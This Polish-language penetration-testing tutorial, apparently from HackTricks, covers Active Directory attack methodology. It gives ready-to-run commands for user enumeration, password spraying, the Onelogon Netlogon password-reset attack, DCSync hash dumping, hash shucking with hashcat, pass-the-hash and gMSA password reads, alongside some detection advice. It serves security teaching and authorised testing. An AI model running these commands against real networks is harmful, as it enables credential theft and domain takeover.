# Metodologia Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

**Active Directory** to podstawowa technologia, która umożliwia **administratorom sieci** sprawne tworzenie i zarządzanie **domenami**, **użytkownikami** oraz **obiektami** w sieci. Została zaprojektowana z myślą o skalowalności i pozwala organizować dużą liczbę użytkowników w łatwe do zarządzania **grupy** i **podgrupy**, a także kontrolować **prawa dostępu** na różnych poziomach.

Struktura **Active Directory** składa się z trzech głównych warstw: **domen**, **drzew** i **lasów**. **Domena** obejmuje zbiór obiektów, takich jak **użytkownicy** lub **urządzenia**, korzystających ze wspólnej bazy danych. **Drzewa** to grupy domen połączonych wspólną strukturą, a **las** to zbiór wielu drzew połączonych za pomocą **relacji zaufania**, stanowiący najwyższą warstwę struktury organizacyjnej. Na każdym z tych poziomów można określić konkretne **prawa dostępu** i **komunikacji**.

Do kluczowych pojęć związanych z **Active Directory** należą:

1. **Katalog** – zawiera wszystkie informacje dotyczące obiektów Active Directory.
2. **Obiekt** – oznacza element katalogu, taki jak **użytkownik**, **grupa** lub **folder udostępniony**.
3. **Domena** – stanowi kontener obiektów katalogu; w obrębie **lasu** może współistnieć wiele domen, z których każda przechowuje własny zbiór obiektów.
4. **Drzewo** – grupa domen współdzielących wspólną domenę główną.
5. **Las** – najwyższy poziom struktury organizacyjnej w Active Directory, złożony z kilku drzew połączonych **relacjami zaufania**.

**Active Directory Domain Services (AD DS)** obejmuje szereg usług kluczowych dla scentralizowanego zarządzania siecią i komunikacji w jej obrębie. Należą do nich:

1. **Domain Services** – centralizuje przechowywanie danych i zarządza interakcjami między **użytkownikami** a **domenami**, w tym funkcjami **uwierzytelniania** i **wyszukiwania**.
2. **Certificate Services** – nadzoruje tworzenie, dystrybucję i zarządzanie bezpiecznymi **certyfikatami cyfrowymi**.
3. **Lightweight Directory Services** – obsługuje aplikacje korzystające z katalogu za pomocą **protokołu LDAP**.
4. **Directory Federation Services** – zapewnia funkcję **single sign-on**, umożliwiającą uwierzytelnianie użytkowników w wielu aplikacjach internetowych w ramach jednej sesji.
5. **Rights Management** – pomaga chronić materiały objęte prawami autorskimi, ograniczając ich nieautoryzowane rozpowszechnianie i używanie.
6. **DNS Service** – ma kluczowe znaczenie dla rozpoznawania **nazw domenowych**.

Szczegółowe wyjaśnienie znajdziesz na stronie: [**TechTerms - definicja Active Directory**](https://techterms.com/definition/active_directory)

### **Uwierzytelnianie Kerberos**

Aby dowiedzieć się, jak **atakować AD**, musisz dobrze **zrozumieć** proces **uwierzytelniania Kerberos**.\
[**Przeczytaj tę stronę, jeśli nie wiesz jeszcze, jak to działa.**](kerberos-authentication.md)

## Ściągawka

Możesz przejść na stronę [https://wadcoms.github.io/](https://wadcoms.github.io), aby szybko sprawdzić, jakich poleceń możesz użyć do enumeracji lub exploitacji AD.

> [!WARNING]
> Komunikacja Kerberos zwykle **wymaga w pełni kwalifikowanej nazwy domenowej (FQDN)**, aby klient mógł uzyskać ticket dla właściwego SPN. Połączenie z maszyną za pomocą adresu IP często powoduje użycie NTLM zamiast Kerberos.

## Recon Active Directory (bez creds/sesji)

Jeśli masz dostęp do środowiska AD, ale nie masz żadnych credentials ani sesji, możesz:

- **Przeprowadzić pentest sieci:**
  - Przeskanować sieć, znaleźć maszyny i otwarte porty, a następnie spróbować **wykorzystać podatności** lub **wyciągnąć credentials** z tych maszyn (na przykład [drukarki mogą być bardzo interesującymi celami](ad-information-in-printers.md)).
  - Enumeracja DNS może dostarczyć informacji o kluczowych serwerach w domenie, takich jak serwery WWW, drukarki, udziały, VPN, media itp.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Zapoznaj się z ogólną [**metodologią pentestów**](../../generic-methodologies-and-resources/pentesting-methodology.md), aby dowiedzieć się więcej.
- **Sprawdzić anonimowy dostęp i dostęp Guest do usług SMB** (nie zadziała to w nowoczesnych wersjach Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Bardziej szczegółowy poradnik dotyczący enumeracji serwera SMB znajdziesz tutaj:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Przeprowadzić enumerację LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Bardziej szczegółowy poradnik dotyczący enumeracji LDAP znajdziesz tutaj (zwróć **szczególną uwagę na dostęp anonimowy**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Zatruć sieć**
  - Zebrać credentials, [**podszywając się pod usługi za pomocą Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Uzyskać dostęp do hosta, [**nadużywając relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Zebrać credentials, **wystawiając** [**fałszywe usługi UPnP za pomocą evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Wyciągnąć nazwy użytkowników i imiona oraz nazwiska z wewnętrznych dokumentów, mediów społecznościowych i usług (głównie WWW) w środowisku domenowym, a także z publicznie dostępnych źródeł.
  - Jeśli znajdziesz imiona i nazwiska pracowników firmy, możesz wypróbować różne konwencje **nazw użytkowników AD** ([**przeczytaj tutaj**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najczęściej spotykane konwencje to: _ImięNazwisko_, _Imię.Nazwisko_, _ImiNaz_ (po 3 litery każdego członu), _Imi.Naz_, _INazwisko_, _I.Nazwisko_, _NazwiskoImię_, _Nazwisko.Imię_, _NazwiskoI_, _Nazwisko.I_, 3 _losowe litery i 3 losowe cyfry_ (abc123).
  - Narzędzia:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracja użytkowników

- **Anonimowa enumeracja SMB/LDAP:** sprawdź strony [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumeracja Kerbrute**: Gdy **serwer otrzyma żądanie dotyczące nieprawidłowej nazwy użytkownika**, odpowie kodem błędu **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, co pozwoli nam ustalić, że nazwa użytkownika jest nieprawidłowa. W przypadku **prawidłowych nazw użytkowników** otrzymamy albo **TGT w odpowiedzi AS-REP**, albo błąd _KRB5KDC_ERR_PREAUTH_REQUIRED_, który oznacza, że użytkownik musi przejść pre-authentication.
- **Brak uwierzytelniania w MS-NRPC**: użycie auth-level = 1 (brak uwierzytelniania) w interfejsie MS-NRPC (Netlogon) kontrolerów domeny. Metoda wiąże się z interfejsem MS-NRPC, a następnie wywołuje funkcję `DsrGetDcNameEx2`, aby sprawdzić, czy dany użytkownik lub komputer istnieje, bez użycia credentials. Narzędzie [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementuje ten rodzaj enumeracji. Opis badań znajdziesz [tutaj](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Jeśli znajdziesz w sieci jeden z takich serwerów, możesz również przeprowadzić **enumerację użytkowników**. Możesz na przykład użyć narzędzia [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Listy nazw użytkowników znajdziesz w [**tym repozytorium na GitHubie**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) oraz w [**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames).
>
> Jednak na podstawie rozpoznania przeprowadzonego wcześniej powinieneś znać **nazwiska osób pracujących w firmie**. Mając imię i nazwisko, możesz użyć skryptu [**namemash.py**](https://gist.github.com/superkojiman/11076951), aby wygenerować potencjalnie prawidłowe nazwy użytkowników.

### Nadużycie listy dozwolonych kanałów Netlogon podatnych na ataki (Onelogon)

Nawet po załataniu **Zerologon** na DC konta jawnie umieszczone na liście dozwolonych mogą być nadal narażone na **starsze/podatne zachowanie bezpiecznego kanału Netlogon**. Ryzykowną konfiguracją jest zasada GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** lub odpowiadająca jej wartość rejestru **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ta wartość jest **deskryptorem zabezpieczeń SDDL** (zob. [Security Descriptors](security-descriptors.md)). Każde konto lub grupa, którym przyznano odpowiedni ACE w DACL, może być celem ataku. Na przykład `O:BAG:BAD:(A;;RC;;;WD)` skutecznie umieszcza na liście dozwolonych **Everyone**.

Praktyczny przebieg działań:

1. **Zidentyfikuj podmioty na liście dozwolonych**, sprawdzając zarówno **SYSVOL/GPO**, jak i **rejestr aktywnego DC**.
2. **Rozwiąż SID-y** znalezione w SDDL, aby ustalić odpowiadających im użytkowników/komputery AD, i nadaj priorytet **kontom komputerów DC**, **kontom zaufania** oraz innym uprzywilejowanym komputerom.
3. Wielokrotnie próbuj **uwierzytelniania MS-NRPC / Netlogon** jako konto z listy dozwolonych.
4. Po odgadnięciu prawidłowych danych uwierzytelniających wykorzystaj **ustawianie hasła przez Netlogon**, aby zresetować hasło konta docelowego (publiczny PoC ustawia je na pusty ciąg).<sup>[[9]](#references)[[10]](#references)</sup>

Szybka analiza wstępna / przykłady laboratoryjne z publicznego artefaktu:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notatki:

- **Skaner** jest przydatny, ponieważ efektywna lista dozwolonych wyjątków może znajdować się w **SYSVOL**, w **rejestrze** lub w obu tych miejscach.
- Sama ścieżka exploita jest istotna, ponieważ po zidentyfikowaniu podatnego konta **nie wymaga uprawnień Domain Admin**.
- Przejęcie **konta komputera kontrolera domeny**, takiego jak `DC$`, jest szczególnie niebezpieczne, ponieważ zresetowanie jego hasła może bezpośrednio otworzyć szersze ścieżki **przejęcia AD**.
- **Możliwość brute-force** zależy od trybu: publiczny artefakt opisuje podejście meet-in-the-middle, **24-bitowy** brute-force, gdy dostępne jest inne konto komputera, oraz wolniejsze warianty **32-bitowe**.

Uwagi dotyczące wykrywania i hardeningu:

- Przeprowadź audyt polityki listy dozwolonych wyjątków i usuń wszystko poza tymczasowymi, wyraźnie wymaganymi wyjątkami zgodności.
- Monitoruj zdarzenia **System** na DC: **5827/5828/5829/5830/5831**, aby wykrywać przypadki, gdy podatne połączenia Netlogon są blokowane, wykrywane lub jawnie dozwolone przez politykę.
- Traktuj konta w `VulnerableChannelAllowList` jako **wysokiego ryzyka**, dopóki zależność od starszego rozwiązania nie zostanie usunięta.

### Gdy znasz jedną lub kilka nazw użytkowników

Dobrze, znasz już prawidłową nazwę użytkownika, ale nie masz haseł... Spróbuj:

- [**ASREPRoast**](asreproast.md): Jeśli użytkownik **nie ma** atrybutu _DONT_REQ_PREAUTH_, możesz **zażądać wiadomości AS_REP** dla tego użytkownika, która będzie zawierać dane zaszyfrowane kluczem wyprowadzonym z hasła użytkownika.
- [**Password Spraying**](password-spraying.md): Wypróbujmy **najczęściej używane hasła** dla każdego z wykrytych użytkowników — być może ktoś używa słabego hasła (pamiętaj o polityce haseł!).
  - Możesz też przeprowadzić **Password Spraying na serwerach OWA**, aby spróbować uzyskać dostęp do serwerów pocztowych użytkowników.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Możesz być w stanie **pozyskać** **hashe** odpowiedzi na wyzwanie, przeprowadzając **poisoning** wybranych protokołów **sieciowych**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Enumeracja Active Directory dostarcza nazw użytkowników, identyfikatorów e-mail i wzorców nazewnictwa, potencjalnych hostów oraz usług, które można skłonić do uwierzytelnienia. Wykorzystaj te informacje, aby zidentyfikować wykonalne [**ataki relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM i potencjalne ścieżki do środowiska AD.

### Rozpoznanie i kontrola konfiguracji relay oparte na workspace NetExec

- Używaj **workspace’ów `nxcdb`**, aby zachować stan rozpoznania AD osobno dla każdego zlecenia: `workspace create <name>` tworzy bazy SQLite dla poszczególnych protokołów w `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap itd.). Przełączaj widoki poleceniem `proto smb|mssql|winrm`, a zebrane sekrety wyświetlaj poleceniem `creds`. Po zakończeniu ręcznie usuń wrażliwe dane: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Szybkie wykrywanie podsieci za pomocą **`netexec smb <cidr>`** ujawnia **domenę**, **kompilację systemu operacyjnego**, **wymagania dotyczące podpisywania SMB** i **Null Auth**. Hosty członkowskie z oznaczeniem `(signing:False)` są **podatne na relay**, natomiast DC często wymagają podpisywania.
- Generuj **nazwy hostów w /etc/hosts** bezpośrednio z danych wyjściowych NetExec, aby ułatwić wybór celów:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Gdy **SMB relay do DC jest blokowany** przez wymóg podpisywania, nadal sprawdź konfigurację **LDAP**: `netexec ldap <dc>` wskazuje `(signing:None)` / słabe channel binding. DC wymagający podpisywania SMB, ale z wyłączonym podpisywaniem LDAP, nadal może być podatnym celem **relay-to-LDAP** dla nadużyć takich jak **RBCD bez SPN**.

### Wycieki poświadczeń z drukarek po stronie klienta → masowa weryfikacja poświadczeń domenowych

- Interfejsy drukarek/www czasami **zawierają zamaskowane hasła administratora w HTML**. Wyświetlenie źródła/devtools może ujawnić tekst jawny (np. `<input value="<password>">`), umożliwiając dostęp Basic-auth do repozytoriów skanów i wydruków.
- Pobrane zadania drukowania mogą zawierać **dokumenty wdrożeniowe w postaci tekstu jawnego** z hasłami poszczególnych użytkowników. Podczas testowania zachowaj prawidłowe przyporządkowanie par:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Kradzież poświadczeń NTLM

Jeśli możesz **uzyskać dostęp do innych komputerów lub udziałów** jako **użytkownik null lub guest**, możesz **umieścić pliki** (np. plik SCF), których otwarcie **wywoła uwierzytelnianie NTLM skierowane do Ciebie**, dzięki czemu możesz **wykraść** **challenge NTLM** i złamać hash:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking i ataki NT-Candidate

**Hash shucking** traktuje każdy posiadany hash NT jako potencjalne hasło w przypadku innych, wolniejszych formatów, których materiał kluczowy jest bezpośrednio wyprowadzany z hasha NT. Zamiast brute-force’ować długie frazy hasłowe w biletach Kerberos RC4, wyzwaniach NetNTLM lub poświadczeniach z pamięci podręcznej, przekazujesz hashe NT do trybów NT-candidate w Hashcat i pozwalasz mu sprawdzić ponowne użycie haseł bez poznawania ich jawnej postaci. Ta metoda jest szczególnie skuteczna po przejęciu domeny, gdy możesz zebrać tysiące aktualnych i historycznych hashy NT.<sup>[[5]](#references)</sup>

Użyj shuckingu, gdy:

- Masz zbiór hashy NT pochodzących z DCSync, zrzutów SAM/SECURITY lub sejfów poświadczeń i chcesz sprawdzić, czy są ponownie używane w innych domenach/lasach.
- Przechwycisz materiał Kerberos oparty na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), odpowiedzi NetNTLM lub bloby DCC/DCC2.
- Chcesz szybko potwierdzić ponowne użycie długich, niemożliwych do złamania fraz hasłowych, a następnie natychmiast wykonać pivot przez Pass-the-Hash.

Ta technika **nie działa** w przypadku typów szyfrowania, których klucze nie są hashem NT (np. Kerberos etype 17/18 AES). Jeśli domena wymusza używanie wyłącznie AES, musisz wrócić do standardowych trybów łamania haseł.

#### Tworzenie zbioru hashy NT

- **DCSync/NTDS** – Użyj `secretsdump.py` z historią, aby pobrać jak najwięcej hashy NT (wraz z ich poprzednimi wartościami):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Wpisy historii znacznie poszerzają pulę kandydatów, ponieważ Microsoft może przechowywać do 24 poprzednich hashy dla każdego konta. Więcej sposobów pozyskiwania sekretów NTDS znajdziesz tutaj:

{{#ref}}
dcsync.md
{{#endref}}

- **Zrzuty cache endpointów** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (lub Mimikatz `lsadump::sam /patch`) wyodrębnia lokalne dane SAM/SECURITY oraz zapisane w cache logowania do domeny (DCC/DCC2). Usuń duplikaty i dodaj te hashe do tej samej listy `nt_candidates.txt`.
- **Śledź metadane** – Zachowuj nazwę użytkownika/domenę, z których pochodzi każdy hash (nawet jeśli wordlista zawiera tylko wartości hex). Dopasowane hashe od razu wskażą, który principal ponownie używa hasła, gdy Hashcat wyświetli znalezionego kandydata.
- Preferuj kandydatów z tego samego lasu lub z zaufanego lasu; maksymalizuje to szansę na pokrywanie się haseł podczas shuckingu.

#### Tryby Hashcat dla kandydatów NT

| Typ hasha                               | Tryb hasła | Tryb kandydata NT |
| --------------------------------------- | ---------- | ----------------- |
| Domain Cached Credentials (DCC)         | 1100       | 31500             |
| Domain Cached Credentials 2 (DCC2)      | 2100       | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS               | 5500       | 27000             |
| NetNTLMv2                               | 5600       | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth     | 7500       | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100      | 35300             |
| Kerberos 5 etype 23 AS-REP              | 18200      | 35400             |

Uwagi:

- Dane wejściowe dla kandydatów NT **muszą pozostać surowymi hashami NT w formacie 32 znaków hex**. Wyłącz silniki reguł (bez `-r` i trybów hybrydowych), ponieważ modyfikowanie uszkodzi materiał klucza kandydata.
- Te tryby nie są z natury szybsze, ale przestrzeń kluczy NTLM (~30 000 MH/s na M3 Max) jest ~100× szybsza niż Kerberos RC4 (~300 MH/s). Testowanie starannie dobranej listy NT jest znacznie tańsze niż przeszukiwanie całej przestrzeni haseł w wolniejszym formacie.
- Zawsze używaj **najnowszej wersji Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), ponieważ tryby 31500/31600/35300/35400 zostały udostępnione niedawno.<sup>[[7]](#references)</sup>
- Obecnie nie ma trybu NT dla AS-REQ Pre-Auth, a etypy AES (19600/19700) wymagają hasła w postaci jawnej, ponieważ ich klucze są wyprowadzane za pomocą PBKDF2 z haseł UTF-16LE, a nie z surowych hashy NT.

#### Przykład – Kerberoast RC4 (tryb 35300)

1. Przechwyć RC4 TGS dla docelowego SPN przy użyciu użytkownika z niskimi uprawnieniami (szczegóły znajdziesz na stronie Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Wykonaj ticket shucking, używając swojej listy NT:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat wyprowadza klucz RC4 z każdego kandydata NT i weryfikuje blob `$krb5tgs$23$...`. Dopasowanie potwierdza, że konto usługi używa jednego z istniejących skrótów NT.

3. Natychmiast wykonaj pivot przez PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   W razie potrzeby możesz później odzyskać tekst jawny za pomocą `hashcat -m 1000 <matched_hash> wordlists/`.

#### Przykład – buforowane dane uwierzytelniające (tryb 31600)

1. Zrzut buforowanych logowań z przejętej stacji roboczej:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Skopiuj linię DCC2 interesującego użytkownika domeny do `dcc2_highpriv.txt` i wykonaj na niej shucking:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Pomyślne dopasowanie ujawnia hash NT, który jest już znany na Twojej liście, co dowodzi, że buforowane konto użytkownika ponownie używa tego samego hasła. Użyj go bezpośrednio do PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) albo przeprowadź brute-force w szybkim trybie NTLM, aby odzyskać hasło w postaci jawnej.

Ten sam workflow dotyczy odpowiedzi na wyzwanie NetNTLM (`-m 27000/27100`) oraz DCC (`-m 31500`). Po znalezieniu dopasowania możesz rozpocząć relay, użyć PtH przez SMB/WMI/WinRM albo ponownie złamać hash NT offline, stosując maski/reguły.



## Enumerowanie Active Directory z poświadczeniami/sesją

Na tym etapie musisz mieć **przejęte poświadczenia lub sesję prawidłowego konta domenowego**. Jeśli masz prawidłowe poświadczenia lub powłokę jako użytkownik domenowy, **pamiętaj, że wcześniej wymienione opcje nadal mogą posłużyć do przejęcia innych użytkowników**.

Zanim rozpoczniesz uwierzytelnione enumerowanie, zapoznaj się z **problemem Kerberos double-hop**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumerowanie

Przejęcie konta to **ważny krok w ocenie domeny**, ponieważ umożliwia uwierzytelnione **enumerowanie Active Directory**:

W przypadku [**ASREPRoast**](asreproast.md) możesz teraz znaleźć wszystkich potencjalnie podatnych użytkowników, a w przypadku [**Password Spraying**](password-spraying.md) możesz uzyskać **listę wszystkich nazw użytkowników** i spróbować hasła przejętego konta, pustych haseł oraz nowych, obiecujących haseł.

- Możesz użyć [**CMD do podstawowego rekonesansu**](../basic-cmd-for-pentesters.md#domain-info)
- Możesz też użyć [**powershell do rekonesansu**](../basic-powershell-for-pentesters/index.html), co będzie bardziej skryte
- Możesz także [**użyć powerview**](../basic-powershell-for-pentesters/powerview.md), aby uzyskać bardziej szczegółowe informacje
- Kolejnym świetnym narzędziem do rekonesansu w Active Directory jest [**BloodHound**](bloodhound.md). **Nie jest ono zbyt skryte** (zależy to od używanych metod zbierania danych), ale **jeśli Ci to nie przeszkadza**, zdecydowanie warto go wypróbować. Sprawdź, gdzie użytkownicy mogą łączyć się przez RDP, znajdź ścieżkę do innych grup itd.
  - **Inne zautomatyzowane narzędzia do enumerowania AD:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Sprawdź [**rekordy DNS AD**](ad-dns-records.md), ponieważ mogą zawierać interesujące informacje.
- Do enumerowania katalogu możesz użyć **narzędzia z GUI**: **AdExplorer.exe** z pakietu **SysInternal** Suite.
- Możesz też przeszukać bazę LDAP za pomocą **ldapsearch**, szukając poświadczeń w polach _userPassword_ i _unixUserPassword_, a także w notatkach użytkownika _description_ i _info_. Nieopisany ciąg przypominający hasło w polu _info_ jest tylko potencjalnym kandydatem: osobno potwierdź jego przeznaczenie i ważność, a podczas rutynowego enumerowania nie umieszczaj treści notatek w wynikach. Zobacz [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment), aby poznać inne metody.
- Jeśli masz odpowiednie uprawnienia, przejrzyj **dostępne** skrypty logowania do domeny i mapowania dysków w lokalizacji `\\<dc>\NETLOGON` lub `\\<dc>\SYSVOL\<domain>\scripts`. [Dokumentacja Microsoft](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) opisuje rolę katalogu skryptów w udziale NETLOGON. Najpierw wyświetl nazwy, a następnie sprawdź tylko odpowiednie, dostępne do odczytu skrypty, które mieszczą się w limicie rozmiaru; podczas rutynowego enumerowania nie zrzucaj całego udziału ani nie wyświetlaj wartości poświadczeń. Wywołanie PowerShell [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **nie chroni** dosłownego hasła zapisanego w skrypcie. Samo wywołanie nie dowodzi, że sekret jest zakodowany na stałe: sprawdź, jakie dane są do niego przekazywane, a następnie osobno zweryfikuj konto, poprawność poświadczeń i uprawnienia. Przegląd skryptu domenowego na zdalnym udziale jest odrębny od enumerowania lokalnego hosta.
- Jeśli używasz **Linuxa**, możesz także enumerować domenę za pomocą [**pywerview**](https://github.com/the-useless-one/pywerview).
- Możesz też wypróbować zautomatyzowane narzędzia, takie jak:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Wyodrębnianie wszystkich użytkowników domeny**

  Uzyskanie wszystkich nazw użytkowników domeny w Windows jest bardzo proste (`net user /domain` ,`Get-DomainUser` lub `wmic useraccount get name,sid`). W Linuxie możesz użyć: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` lub `enum4linux -a -u "user" -p "password" <DC IP>`

> Mimo że ta sekcja dotycząca enumerowania wygląda na krótką, jest najważniejszą częścią całości. Otwórz odnośniki (przede wszystkim do cmd, powershell, powerview i BloodHound), naucz się enumerować domenę i ćwicz, aż poczujesz się pewnie. Podczas oceny będzie to kluczowy moment, który pozwoli znaleźć drogę do DA albo stwierdzić, że nie da się nic zrobić.

### Przewidywalne, wcześniej utworzone konta komputerów -> dostęp do haseł gMSA

Konta komputerów przygotowane z myślą o starszych metodach dołączania do domeny mogą zachować przewidywalne hasło początkowe. Moduł `pre2k` w NetExec identyfikuje charakterystyczną wartość `userAccountControl` równą `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) i próbuje uzyskać Kerberos TGT, używając pierwszych 14 znaków nazwy komputera zapisanej małymi literami, bez końcowego `$`. Traktuj tę wartość UAC jako kryterium wyboru potencjalnych kandydatów; samo członkostwo w **Pre-Windows 2000 Compatible Access** nie dowodzi, że hasło jest słabe.<sup>[[18]](#references)[[20]](#references)</sup>

Użyj uwierzytelnionego enumerowania LDAP, aby sprawdzić kandydatów i zapisać uzyskane TGT. `ALL=True` rozszerza testowanie na obiekty wykraczające poza domyślny filtr `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Nieudany bind domyślny/NTLM **nie** unieważnia tego ustalenia: przetestuj z `-k`, używając FQDN, który rozwiązuje się do DC, oraz zegara zsynchronizowanego z KDC. Pomyślne uruchomienia modułu zapisują listy kandydatów i uzyskane ccaches w `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Po przejęciu principal komputera sprawdź jego zagnieżdżone członkostwa w grupach i uprawnienia wychodzące. W szczególności principals wymienione w deskryptorze bezpieczeństwa `msDS-GroupMSAMembership` obiektu gMSA mogą odczytać `msDS-ManagedPassword`; wynik `--gmsa` w NetExec pokazuje dozwolone principals i zwraca bieżący hash NT, jeśli uwierzytelniający się komputer ma do tego uprawnienia.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

